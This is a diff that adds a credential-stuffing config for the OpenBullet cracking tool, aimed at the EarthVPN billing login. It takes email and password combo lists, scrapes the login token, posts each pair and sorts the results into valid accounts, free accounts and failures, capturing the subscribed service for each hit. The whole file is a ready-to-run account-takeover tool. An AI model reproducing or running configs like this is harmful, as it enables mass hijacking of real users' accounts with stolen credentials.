@@ -1,0 +1,59 @@
+[SETTINGS]
+{
+  "Name": "earthvpn",
+  "SuggestedBots": 10,
+  "MaxCPM": 0,
+  "LastModified": "2019-06-10T00:44:46.3308469-05:00",
+  "AdditionalInfo": "acc with no vpn go to free",
+  "Author": "BowseR",
+  "Version": "1.2.6.4 [Paradox Mod]",
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": false,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "EncodeData": false,
+  "AllowedWordlist1": "MailPass",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+REQUEST GET "https://www.earthvpn.com/billing/dologin.php" 
+  
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+
+#TOKEN PARSE "<SOURCE>" LR "value=\"" "\" />" -> VAR "TOKEN" 
+
+REQUEST POST "https://www.earthvpn.com/billing/dologin.php" 
+  CONTENT "token=<TOKEN>&username=<USER>&password=<PASS>" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+
+KEYCHECK 
+  KEYCHAIN Success OR 
+    KEY "Logout" 
+  KEYCHAIN Failure OR 
+    KEY "Login Details Incorrect. Please try again." 
+
+#Service PARSE "<SOURCE>" LR "action=products\"><strong>" "</strong> " -> CAP "Service" 
+
+KEYCHECK 
+  KEYCHAIN Custom "FREE" OR 
+    KEY "products\"><strong>0</strong>" 
+  KEYCHAIN Success OR 
+    KEY "<SOURCE>" DoesNotContain "products\"><strong>0</strong>" 
+
